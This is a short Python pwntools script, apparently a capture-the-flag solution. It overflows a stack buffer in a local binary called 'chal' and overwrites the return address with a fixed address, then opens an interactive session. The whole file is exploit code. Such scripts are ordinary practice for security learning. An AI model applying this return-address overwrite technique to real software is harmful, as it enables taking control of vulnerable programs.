from pwn import * # grap everything from pwntools
exe = './chal'
s = '''
b * 401349
c
'''
p = process(exe)
#p = gdb.debug(exe, s)
payload = b'A' * 16 + b'B' * 8 + p64(0x00000000004011b6) # b'\xb6'
p.sendline(payload)
p.interactive()